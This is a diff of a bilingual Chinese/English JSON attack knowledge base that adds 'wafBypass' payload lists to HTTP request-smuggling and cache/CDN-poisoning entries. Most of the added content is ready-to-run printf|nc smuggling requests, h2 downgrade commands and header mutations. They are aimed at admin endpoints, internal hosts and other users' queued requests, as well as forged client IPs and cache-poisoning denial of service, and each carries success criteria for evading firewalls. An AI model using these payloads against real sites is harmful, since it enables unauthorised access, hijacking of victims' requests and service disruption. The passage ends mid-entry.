+            "en": "Case-sensitive TE rules bypassed. Success: SMUGGLED joins the next request."
+          }
+        },
+        {
+          "title": {
+            "zh": "制表符分隔变形",
+            "en": "Tab-separator mutation"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 13\\r\\nTransfer-Encoding:\\tchunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "冒号后用 TAB 替代空格改变头部指纹。判据：走私成功。",
+            "en": "Tab after the colon changes the fingerprint. Success: smuggle works."
+          }
+        },
+        {
+          "title": {
+            "zh": "双 CL 大小写差异",
+            "en": "Dual-CL case differential"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 6\\r\\nContent-length: 0\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "两处 CL 大小写不同被不同组件各取其一。判据：后端按 6 解析吞入走私段。",
+            "en": "Differently-cased CL headers get picked independently. Success: backend consumes the smuggled bytes."
+          }
+        },
+        {
+          "title": {
+            "zh": "走私内网目标",
+            "en": "Smuggle to internal target"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: internal\\r\\n\\r\\n' | nc {TARGET} 80",
+          "description": {
+            "zh": "走私请求直指内网 Host。判据：返回内网资源。",
+            "en": "Smuggled request targets an internal host. Success: internal resource returned."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-te-te-te",
@@ -2464,8 +2996,8 @@
         "en": "Request Smuggling"
       },
       "subCategory": {
-        "zh": "Transfer-Encoding 多值混淆",
-        "en": "Transfer-Encoding Multi-Value Ambiguity"
+        "zh": "重复与混淆分帧头",
+        "en": "Duplicate & Obfuscated Framing Headers"
       },
       "tutorial": {
         "overview": {
@@ -2533,7 +3065,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "chunked+identity 值差异",
+            "en": "chunked + identity value split"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: identity\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "后端取最后一个值忽略 chunked 分帧。判据：走私生效。",
+            "en": "Backend honors the last value and drops chunked framing. Success: smuggle works."
+          }
+        },
+        {
+          "title": {
+            "zh": "空格+大小写组合",
+            "en": "Space + case combination"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nTransfer-Encoding : chunked\\r\\nTransfer-encoding: xchunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "多重变形叠加对抗严格规则。判据：任一层接受即走私成功。",
+            "en": "Stacked mutations against strict rules. Success: smuggle works if any layer accepts."
+          }
+        },
+        {
+          "title": {
+            "zh": "非法前缀值混淆",
+            "en": "Invalid-prefixed value confusion"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nTransfer-Encoding: xchunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "首值非法次值有效，不同解析器取舍不同。判据：响应差异暴露分歧点。",
+            "en": "First value invalid, second valid; parsers pick differently. Success: response delta reveals the split."
+          }
+        },
+        {
+          "title": {
+            "zh": "重复等值 TE",
+            "en": "Duplicated identical TE"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "完全重复头部分化\"拒绝重复\"与\"折叠合并\"实现。判据：SMUGGLED 生效。",
+            "en": "Exact duplicates split reject-vs-merge implementations. Success: SMUGGLED effective."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-transfer-encoding",
@@ -2574,8 +3152,8 @@
         "en": "Request Smuggling"
       },
       "subCategory": {
-        "zh": "TE 规范化差异",
-        "en": "Transfer-Encoding Normalization Differential"
+        "zh": "重复与混淆分帧头",
+        "en": "Duplicate & Obfuscated Framing Headers"
       },
       "tutorial": {
         "overview": {
@@ -2647,6 +3225,52 @@
       "tags": [
         "httpbypass",
         "transfer_encoding"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "逗号值混淆",
+            "en": "Comma-value confusion"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nTransfer-Encoding: chunked,identity\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "单头多值使前后端各取所需。判据：走私生效。",
+            "en": "Multiple values in one header get parsed differently. Success: smuggle works."
+          }
+        },
+        {
+          "title": {
+            "zh": "全大写变形",
+            "en": "Full-uppercase mutation"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nTRANSFER-ENCODING: CHUNKED\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "头与值全大写绕过小写规则。判据：SMUGGLED 生效。",
+            "en": "Everything uppercase. Success: SMUGGLED effective."
+          }
+        },
+        {
+          "title": {
+            "zh": "空格 TAB 组合",
+            "en": "Space + TAB combination"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nTransfer-Encoding: \\tchunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "值前混合空白改变指纹。判据：走私成功。",
+            "en": "Mixed whitespace before the value. Success: smuggle works."
+          }
+        },
+        {
+          "title": {
+            "zh": "垃圾前缀值",
+            "en": "Junk-prefixed value"
+          },
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nTransfer-Encoding: cowchunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "首值拼接绕过整词匹配。判据：分歧行为暴露。",
+            "en": "Concatenated first value dodges whole-word rules. Success: divergent behavior exposed."
+          }
+        }
       ]
     },
     {
@@ -2688,8 +3312,8 @@
         "en": "Request Smuggling"
       },
       "subCategory": {
-        "zh": "H2 降级请求定界",
-        "en": "HTTP/2 Downgrade Framing"
+        "zh": "重复与混淆分帧头",
+        "en": "Duplicate & Obfuscated Framing Headers"
       },
       "tutorial": {
         "overview": {
@@ -2757,7 +3381,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "h2 降级 CL+TE 共存",
+            "en": "h2 downgrade CL+TE coexistence"
+          },
+          "command": "nghttp -v 'https://{TARGET}' -H 'content-length: 5' -H 'transfer-encoding: chunked' -d body.txt",
+          "description": {
+            "zh": "h2 请求携带 CL 与 TE 头降级到 h1 时分帧分歧。判据：响应异常或走私生效。",
+            "en": "Carrying both CL and TE over h2 splits framing on downgrade. Success: abnormal response or smuggle."
+          }
+        },
+        {
+          "title": {
+            "zh": "h2c 明文升级走私",
+            "en": "h2c cleartext upgrade smuggling"
+          },
+          "command": "curl -i 'http://{TARGET}' -H 'Connection: Upgrade, HTTP2-Settings' -H 'Upgrade: h2c' --http2-prior-knowledge",
+          "description": {
+            "zh": "h2c 升级绕过中间件（其只识别 h1）。判据：升级成功后直连后端。",
+            "en": "h2c upgrade bypasses h1-only middleboxes. Success: direct backend channel after upgrade."
+          }
+        },
+        {
+          "title": {
+            "zh": "h2 双 content-length",
+            "en": "h2 dual content-length"
+          },
+          "command": "h2smuggler.py -t {TARGET} -x 'POST / HTTP/2' -H 'content-length: 0' -H 'content-length: 44'",
+          "description": {
+            "zh": "h2 层双 CL 在降级代理处歧义。判据：后端按不同 CL 分帧。",
+            "en": "Dual CL over h2 confuses downgrading proxies. Success: backend frames by a different CL."
+          }
+        },
+        {
+          "title": {
+            "zh": "伪头部乱序",
+            "en": "Pseudo-header reordering"
+          },
+          "command": "h2smuggler.py -t {TARGET} -x 'GET /admin HTTP/2' --reorder-pseudo",
+          "description": {
+            "zh": ":method 等伪头部置于普通头之后触发宽容解析差异。判据：内网路径可达。",
+            "en": "Pseudo-headers after regular headers trigger lenient parsing. Success: internal path reached."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-api",
@@ -2798,8 +3468,8 @@
         "en": "Request Smuggling"
       },
       "subCategory": {
-        "zh": "走私请求目标矩阵",
-        "en": "Smuggled Request-Target Matrix"
+        "zh": "走私利用场景",
+        "en": "Smuggling Exploitation Scenarios"
       },
       "tutorial": {
         "overview": {
@@ -2867,7 +3537,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "CL.CL 走私 API 端点",
+            "en": "CL.CL smuggling to API endpoint"
+          },
+          "command": "printf 'POST /api/v1/checkout HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 62\\r\\nContent-Length: 0\\r\\n\\r\\nPOST /api/v1/admin/users HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 0\\r\\n\\r\\n' | nc {TARGET} 80",
+          "description": {
+            "zh": "双 CL 差异把管理端请求走私给后端。判据：返回管理接口数据。",
+            "en": "Dual-CL split smuggles an admin call. Success: admin API data returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "走私携带内部头",
+            "en": "Smuggle with internal headers"
+          },
+          "command": "printf 'POST /api/v1/orders HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /api/admin HTTP/1.1\\r\\nHost: {TARGET}\\r\\nX-Internal-Role: admin\\r\\n\\r\\n' | nc {TARGET} 80",
+          "description": {
+            "zh": "走私请求注入仅前端可信的内部头。判据：以 admin 身份获得响应。",
+            "en": "Injects front-end-trusted internal headers via the smuggled request. Success: admin-authorized response."
+          }
+        },
+        {
+          "title": {
+            "zh": "批量受害者队列毒化",
+            "en": "Queue poisoning of victims"
+          },
+          "command": "printf 'POST /api/v1/cart HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /api/v1/transfer?to=eva HTTP/1.1\\r\\nHost: {TARGET}\\r\\n\\r\\n' | nc {TARGET} 80",
+          "description": {
+            "zh": "走私占位后下一个真实用户请求被误处理。判据：受害者请求返回异常内容。",
+            "en": "Next victim request gets misattributed. Success: victim response contains abnormal content."
+          }
+        },
+        {
+          "title": {
+            "zh": "WebSocket 升级走私内网",
+            "en": "WebSocket-upgrade internal smuggling"
+          },
+          "command": "printf 'GET /chat HTTP/1.1\\r\\nHost: {TARGET}\\r\\nConnection: Upgrade\\r\\nUpgrade: websocket\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /internal/metrics HTTP/1.1\\r\\nHost: internal\\r\\n\\r\\n' | nc {TARGET} 80",
+          "description": {
+            "zh": "升级请求附加分帧头把内部请求带入长连接。判据：metrics 数据到达。",
+            "en": "Framing headers on an upgrade request smuggle into the long-lived connection. Success: metrics data arrives."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-cloudflare",
@@ -2908,8 +3624,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "动态页面伪静态缓存",
-        "en": "Dynamic Page Cached as Static"
+        "zh": "缓存欺骗与私有内容泄露",
+        "en": "Cache Deception & Private Content Leakage"
       },
       "tutorial": {
         "overview": {
@@ -2976,7 +3692,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "扩展名大小写变形",
+            "en": "Extension Case Mutation"
+          },
+          "command": "/home.php/.CSS\n/home.php/.Js\n/home.php/.Png",
+          "description": {
+            "zh": "绕过小写后缀精确匹配的缓存规则：大写扩展名仍按静态处理。成功判据：返回缓存的动态页面。",
+            "en": "Bypasses cache rules matching lowercase suffixes exactly since uppercase extensions still classify as static. Success: the dynamic page returns from cache."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码斜杠变形",
+            "en": "Encoded-Slash Mutation"
+          },
+          "command": "/home.php%2F.css\n/home.php/.%63ss\n/home.php%2f%2Ecss",
+          "description": {
+            "zh": "编码斜杠与点组合绕过路径分隔匹配。成功判据：命中静态缓存键返回动态内容。",
+            "en": "Encoded slashes and dots bypass separator matching. Success: hits the static cache key and returns dynamic content."
+          }
+        },
+        {
+          "title": {
+            "zh": "多重扩展叠加",
+            "en": "Stacked Multi-Extension"
+          },
+          "command": "/home.php/.css.js\n/home.php/.ico.png\n/home.php/.svg.css",
+          "description": {
+            "zh": "多重后缀命中不同层各自认定的静态形态。成功判据：任一组合返回缓存动态页。",
+            "en": "Stacked suffixes satisfy each layer's notion of static. Success: any combination returns the cached dynamic page."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-awesome-waf",
@@ -3255,8 +4006,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "Host 派生缓存投毒",
-        "en": "Host-Derived Cache Poisoning"
+        "zh": "缓存键与未键入头投毒",
+        "en": "Cache Key & Unkeyed Header Poisoning"
       },
       "tutorial": {
         "overview": {
@@ -3328,6 +4079,41 @@
       "tags": [
         "httpbypass",
         "x_forwarded_host"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头大小写与双写变形",
+            "en": "Header Case & Duplication Mutation"
+          },
+          "command": "x-forwarded-host: {ATTACKER_HOST}\nX-Forwarded-Host: {ATTACKER_HOST}\nx-FORWARDED-HOST: {ATTACKER_HOST}",
+          "description": {
+            "zh": "绕过头名精确规范化前的特征：大小写变体仍进入派生逻辑。成功判据：响应引用攻击者主机。",
+            "en": "Bypasses signatures applied before header-name normalization since case variants still reach derivation logic. Success: the response references the attacker host."
+          }
+        },
+        {
+          "title": {
+            "zh": "替代派生头族",
+            "en": "Alternate Derivation Header Family"
+          },
+          "command": "X-Host: {ATTACKER_HOST}\nX-Forwarded-Server: {ATTACKER_HOST}\nForwarded: host={ATTACKER_HOST}\nX-Original-Host: {ATTACKER_HOST}",
+          "description": {
+            "zh": "轮换同义派生头命中未键入的取值字段。成功判据：任一头触发投毒响应。",
+            "en": "Rotating synonymous derivation headers hits unkeyed extraction fields. Success: any header triggers the poisoned response."
+          }
+        },
+        {
+          "title": {
+            "zh": "值编码与端口变形",
+            "en": "Value Encoding & Port Mutation"
+          },
+          "command": "X-Forwarded-Host: {ATTACKER_HOST}%3A443\nX-Forwarded-Host: {ATTACKER_HOST}:443\nX-Forwarded-Host: {ATTACKER_HOST}.",
+          "description": {
+            "zh": "编码端口、显式端口与尾点变形绕过主机值白名单。成功判据：投毒值被采信。",
+            "en": "Encoded port, explicit port, and trailing-dot mutations bypass host-value allowlists. Success: the poisoned value is honored."
+          }
+        }
       ]
     },
     {
@@ -3369,8 +4155,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "内部路径未入缓存键",
-        "en": "Unkeyed Internal Path"
+        "zh": "缓存键与未键入头投毒",
+        "en": "Cache Key & Unkeyed Header Poisoning"
       },
       "tutorial": {
         "overview": {
@@ -3438,7 +4224,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双重写头叠加",
+            "en": "Dual Rewrite Headers"
+          },
+          "command": "X-Original-URL: /internal\nX-Rewrite-URL: /internal",
+          "description": {
+            "zh": "双覆盖头并存命中实现读取的任一字段。成功判据：缓存投毒内容返回给普通请求。",
+            "en": "Both override headers coexist to hit whichever the implementation reads. Success: poisoned cache content serves to plain requests."
+          }
+        },
+        {
+          "title": {
+            "zh": "头值编码变形",
+            "en": "Header-Value Encoding Mutation"
+          },
+          "command": "X-Original-URL: /%69nternal\nX-Original-URL: /internal%2f\nX-Original-URL: //internal",
+          "description": {
+            "zh": "编码路径值绕过头值特征匹配且规范化等价。成功判据：内部路由命中并缓存。",
+            "en": "Encoded path values bypass header-value signatures while normalizing equivalently. Success: the internal route is hit and cached."
+          }
+        },
+        {
+          "title": {
+            "zh": "键变形规避变体",
+            "en": "Key-Mutation Evasion Variant"
+          },
+          "command": "X-Original-URL: /internal?_=1\nX-Original-URL: /internal/\nX-Original-URL: /internal;v=1",
+          "description": {
+            "zh": "尾缀变形使投毒请求与受害请求键不同规避检测。成功判据：投毒响应命中受害键。",
+            "en": "Trailing mutations differ from victim keys to evade detection. Success: the poisoned response matches the victim key."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-x-rewrite-url",
@@ -3479,8 +4300,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "重写路由缓存错配",
-        "en": "Rewrite-Route Cache Mismatch"
+        "zh": "缓存键与未键入头投毒",
+        "en": "Cache Key & Unkeyed Header Poisoning"
       },
       "tutorial": {
         "overview": {
@@ -3548,7 +4369,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "值编码变形",
+            "en": "Encoded-Value Mutation"
+          },
+          "command": "X-Rewrite-URL: /%61pi/config\nX-Rewrite-URL: /api%2Fconfig",
+          "description": {
+            "zh": "编码的路径段与斜杠绕过头值匹配。成功判据：重写路由命中目标。",
+            "en": "Encoded segments and slashes bypass header-value matching. Success: the rewritten route hits the target."
+          }
+        },
+        {
+          "title": {
+            "zh": "尾部斜杠与点段变形",
+            "en": "Trailing Slash & Dot-Segment Mutation"
+          },
+          "command": "X-Rewrite-URL: /debug/.\nX-Rewrite-URL: /debug//\nX-Rewrite-URL: /debug/..;/actuator",
+          "description": {
+            "zh": "尾部形态改变键但规范化后命中同一路由。成功判据：投毒内容缓存并返回。",
+            "en": "Trailing shapes alter the key yet normalize onto the same route. Success: poisoned content is cached and returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "双头组合投毒",
+            "en": "Dual-Header Combo Poisoning"
+          },
+          "command": "X-Rewrite-URL: /api/config\nX-Original-URL: /",
+          "description": {
+            "zh": "重写头与原始头组合使缓存层与源站取不同路由。成功判据：缓存返回内部配置内容。",
+            "en": "The rewrite and original headers make the cache and origin read different routes. Success: the cache serves internal config content."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-x-forwarded-scheme-proto",
@@ -3589,8 +4445,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "派生协议未入缓存键",
-        "en": "Unkeyed Derived Scheme"
+        "zh": "缓存键与未键入头投毒",
+        "en": "Cache Key & Unkeyed Header Poisoning"
       },
       "tutorial": {
         "overview": {
@@ -3662,6 +4518,41 @@
       "tags": [
         "httpbypass",
         "x_forwarded_scheme"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "替代协议头族",
+            "en": "Alternate Protocol Header Family"
+          },
+          "command": "X-Forwarded-Proto-Ssl: on\nFront-End-Https: on\nX-Forwarded-Protocol: https\nX-Url-Scheme: https",
+          "description": {
+            "zh": "轮换协议派生头命中未键入字段。成功判据：响应以注入协议构造 URL。",
+            "en": "Rotating protocol derivation headers hits unkeyed fields. Success: response URLs are built with the injected scheme."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写与混合值变形",
+            "en": "Case & Mixed-Value Mutation"
+          },
+          "command": "X-Forwarded-Proto: HTTPS\nX-Forwarded-Scheme: HttpS\nX-Forwarded-Proto: https ",
+          "description": {
+            "zh": "大小写与尾空格变形绕过协议值白名单。成功判据：投毒协议被采信。",
+            "en": "Case and trailing-space mutations bypass scheme allowlists. Success: the poisoned scheme is honored."
+          }
+        },
+        {
+          "title": {
+            "zh": "多值协议变形",
+            "en": "Multi-Value Scheme Mutation"
+          },
+          "command": "X-Forwarded-Proto: https,http\nX-Forwarded-Proto: http;https",
+          "description": {
+            "zh": "逗号/分号多值命中取首/取尾不同的解析层。成功判据：投毒响应产生。",
+            "en": "Comma/semicolon multi-values hit layers that pick first vs last differently. Success: a poisoned response is produced."
+          }
+        }
       ]
     },
     {
@@ -3703,8 +4594,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "缓存资格与寿命差异",
-        "en": "Cache Eligibility and Lifetime Differential"
+        "zh": "缓存键与未键入头投毒",
+        "en": "Cache Key & Unkeyed Header Poisoning"
       },
       "tutorial": {
         "overview": {
@@ -3771,7 +4662,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "多指令叠加变形",
+            "en": "Stacked Multi-Directive Mutation"
+          },
+          "command": "Cache-Control: no-cache, no-store, max-age=0\nCache-Control: no-cache\r\nCache-Control: max-age=0",
+          "description": {
+            "zh": "多指令与重复头叠加命中不同的解析归并策略。成功判据：响应缓存行为发生跳变。",
+            "en": "Stacked directives and duplicate headers hit different merge strategies. Success: cache behavior jumps."
+          }
+        },
+        {
+          "title": {
+            "zh": "指令编码变形",
+            "en": "Directive Encoding Mutation"
+          },
+          "command": "Cache-Control: no%2Dcache\nCache-Control: no-cache=1\nCache-Control: \"no-cache\"",
+          "description": {
+            "zh": "编码连字符、伪参数与引号包裹绕过指令白名单。成功判据：指令仍被解释为标准语义。",
+            "en": "Encoded hyphens, pseudo-params, and quoting bypass directive allowlists. Success: the directive is still interpreted with standard semantics."
+          }
+        },
+        {
+          "title": {
+            "zh": "Pragma 兼容头替代",
+            "en": "Pragma Compatibility Alternative"
+          },
+          "command": "Pragma: no-cache\nPragma: no-cache\r\nCache-Control: max-age=0",
+          "description": {
+            "zh": "老协议头与标准头组合命中仅实现单一处理的缓存层。成功判据：绕过缓存资格判定。",
+            "en": "The legacy header combined with the standard one hits caches implementing only one. Success: cache eligibility checks are bypassed."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-vary-header",
@@ -3924,8 +4850,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "Akamai 内部头伪造",
-        "en": "Akamai Internal-Header Spoofing"
+        "zh": "CDN 专有头投毒",
+        "en": "CDN Proprietary Header Poisoning"
       },
       "tutorial": {
         "overview": {
@@ -3993,7 +4919,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头大小写与下划线变形",
+            "en": "Case & Underscore Mutation"
+          },
+          "command": "x-akamai-edgescape: geolocation=\"1.2.3.4\"\nX_AKAMAI_EDGESCAPE: market=US\nX-AKAMAI-SESSION-INFO: token=x",
+          "description": {
+            "zh": "大小写与下划线变体命中边缘头规范化差异。成功判据：响应按伪造地理/会话逻辑变化。",
+            "en": "Case and underscore variants hit edge-header normalization gaps. Success: responses change per the forged geo/session logic."
+          }
+        },
+        {
+          "title": {
+            "zh": "Pragama 专有指令变形",
+            "en": "Pragma Proprietary Mutation"
+          },
+          "command": "Pragma: Akamai-X-Get-Expiry, Akamai-X-Get-Cache-Key, Akamai-X-Get-True-Cache-Key\nX-Akamai-Transformed: 9",
+          "description": {
+            "zh": "Akamai 调试 Pragma 指令变形绕过禁用并泄露缓存键。成功判据：响应头返回真缓存键信息。",
+            "en": "Mutated Akamai debug Pragma directives evade disabling and leak cache keys. Success: response headers reveal true cache-key details."
+          }
+        },
+        {
+          "title": {
+            "zh": "组合边缘头投毒",
+            "en": "Combined Edge-Header Poisoning"
+          },
+          "command": "X-Akamai-Edgescape: geolocation=1.2.3.4, country_code=US\nX-True-Client-IP: 127.0.0.1\nAccept-Encoding: identity",
+          "description": {
+            "zh": "地理与客户端 IP 头组合改变边缘决策但未入缓存键。成功判据：投毒变体缓存命中。",
+            "en": "Geo and client-IP header combos alter edge decisions without entering the cache key. Success: the poisoned variant gets a cache hit."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-fastly",
@@ -4034,8 +4995,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "Fastly 派生头信任",
-        "en": "Fastly Derived-Header Trust"
+        "zh": "CDN 专有头投毒",
+        "en": "CDN Proprietary Header Poisoning"
       },
       "tutorial": {
         "overview": {
@@ -4103,7 +5064,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "源站头覆盖变形",
+            "en": "Origin-Host Override Mutation"
+          },
+          "command": "Fastly-Orig-Host: {ATTACKER_HOST}\nX-Orig-Host: {ATTACKER_HOST}\nX-Backend-Host: {ATTACKER_HOST}",
+          "description": {
+            "zh": "轮换源站指定头命中未键入的回源取值。成功判据：缓存内容来自攻击者源。",
+            "en": "Rotating origin-selection headers hits unkeyed fetch values. Success: cached content comes from the attacker origin."
+          }
+        },
+        {
+          "title": {
+            "zh": "Varnish 伪造变形",
+            "en": "Forged Varnish Mutation"
+          },
+          "command": "X-Varnish: 1234567890\nX-Varnish: 1, 2, 3\nX-Varnish-IP: 127.0.0.1",
+          "description": {
+            "zh": "伪造 X-Varnish 链使边缘认为是内部代理链。成功判据：边缘按内部请求处理并缓存投毒内容。",
+            "en": "Forged X-Varnish chains make the edge treat the request as an internal proxy chain. Success: the edge processes it internally and caches poisoned content."
+          }
+        },
+        {
+          "title": {
+            "zh": "代理能力声明变形",
+            "en": "Capability Declaration Mutation"
+          },
+          "command": "Surrogate-Capability: key=Surrogate/1.0\nSurrogate-Key: admincontent\nSurrogate-Control: max-age=999999",
+          "description": {
+            "zh": "声明代理能力使边缘接受 Surrogate 控制指令覆盖缓存策略。成功判据：按注入的 surrogate 指令缓存。",
+            "en": "Declaring surrogate capability makes the edge accept Surrogate directives overriding cache policy. Success: caching follows the injected surrogate directives."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-cloudflare-ext",
@@ -4144,8 +5140,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "CF 派生属性信任",
-        "en": "Cloudflare Derived-Attribute Trust"
+        "zh": "CDN 专有头投毒",
+        "en": "CDN Proprietary Header Poisoning"
       },
       "tutorial": {
         "overview": {
@@ -4213,7 +5209,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "连接 IP 头变形",
+            "en": "Connecting-IP Mutation"
+          },
+          "command": "CF-Connecting-IP: 127.0.0.1\nCF-Connecting-IP: 10.0.0.1\nCF-Connecting-IP: 127.0.0.1, 10.0.0.1",
+          "description": {
+            "zh": "单值与链式值变形命中源站取 IP 的不同实现。成功判据：访问控制按伪造 IP 放行。",
+            "en": "Single and chained values hit different origin IP-extraction implementations. Success: access control passes per the forged IP."
+          }
+        },
+        {
+          "title": {
+            "zh": "访客 JSON 结构变形",
+            "en": "Visitor JSON Structure Mutation"
+          },
+          "command": "CF-Visitor: {\"scheme\":\"https\\u0022;evil\":\"1\"}\nCF-Visitor: {\"scheme\":\"javascript\"}\nCF-Visitor: {\"scheme\":\"HTTPS\"}",
+          "description": {
+            "zh": "JSON 结构与编码注入改变协议派生。成功判据：响应或跳转按注入 scheme 构造。",
+            "en": "JSON structural and encoding injection alters scheme derivation. Success: responses or redirects are built with the injected scheme."
+          }
+        },
+        {
+          "title": {
+            "zh": "真客户端头替代",
+            "en": "True-Client Header Alternative"
+          },
+          "command": "True-Client-IP: 127.0.0.1\nCF-IPCountry: US,127.0.0.1\nCF-Worker: {ATTACKER_HOST}",
+          "description": {
+            "zh": "替代头族命中未清洗的派生字段。成功判据：任一头触发边缘决策改变并缓存。",
+            "en": "The alternative header family hits unsanitized derivation fields. Success: any header alters edge decisions and gets cached."
+          }
+        }
+      ]
     },
     {
       "id": "httpbypass-dosy-denial-of-service-via-cac",
@@ -4254,8 +5285,8 @@
         "en": "Cache & CDN Security"
       },
       "subCategory": {
-        "zh": "错误响应持久缓存",
-        "en": "Persistent Caching of Error Responses"
+        "zh": "缓存键与未键入头投毒",
+        "en": "Cache Key & Unkeyed Header Poisoning"
       },
       "tutorial": {
         "overview": {
@@ -4327,6 +5358,41 @@
       "tags": [
         "httpbypass",
         "dosy_denial_of_service"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "超长主机填充",
+            "en": "Long-Host Padding"
+          },
+          "command": "X-Forwarded-Host: {ATTACKER_HOST}-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "description": {
+            "zh": "超长值绕过长度受限的黑名单并触发后端解析失败持久缓存。成功判据：错误响应被缓存分发给其他用户。",
+            "en": "Overlong values bypass length-limited blacklists and trigger a persistently cached backend failure. Success: the error response is cached and served to others."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码空值注入",
+            "en": "Encoded Null Injection"
+          },
+          "command": "X-Forwarded-Host: {ATTACKER_HOST}%00\nX-Forwarded-Host: %00{ATTACKER_HOST}\nX-Forwarded-Host: %2500",
+          "description": {
+            "zh": "编码 NUL 在解码层截断主机名造成解析异常。成功判据：异常响应进入缓存。",
+            "en": "Encoded NULs truncate the hostname at the decode layer causing parse failures. Success: the failure response enters the cache."
+          }
+        },
+        {
+          "title": {
